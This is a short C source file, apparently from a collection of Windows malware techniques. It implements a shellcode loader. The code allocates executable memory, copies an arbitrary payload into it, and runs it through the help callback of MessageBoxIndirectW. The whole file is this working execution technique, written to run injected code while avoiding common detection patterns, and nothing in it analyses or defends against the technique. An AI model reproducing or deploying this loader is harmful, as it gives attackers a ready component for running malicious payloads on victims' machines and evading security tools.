#include "Win32Helper.h"

VOID InvokeMessageBoxIndirectWCallbackRoutine(LPVOID lpParameter)
{
	MSGBOXPARAMS MessageBoxParams = { 0 };
	MessageBoxParams.cbSize = sizeof(MSGBOXPARAMS);
	MessageBoxParams.dwStyle = MB_HELP;
	MessageBoxParams.lpfnMsgBoxCallback = (MSGBOXCALLBACK)lpParameter;
	MessageBoxParams.lpszText = L"";

	MessageBoxIndirectW(&MessageBoxParams);
}

BOOL MpfSceViaMessageBoxIndirectW(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeMessageBoxIndirectWCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}